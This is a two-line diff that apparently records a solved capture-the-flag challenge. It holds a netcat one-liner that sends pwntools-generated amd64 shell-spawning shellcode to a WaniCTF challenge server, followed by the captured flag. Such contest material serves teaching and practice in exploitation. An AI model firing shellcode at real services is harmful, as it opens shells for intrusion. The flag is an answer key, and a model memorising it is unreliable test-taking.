@@ -1,0 +1,2 @@
+(pwn shellcraft -f raw amd64.linux.sh; cat) | nc shell-basic-pwn.wanictf.org 9004
+FLAG{NXbit_Blocks_shellcode_next_step_is_ROP}
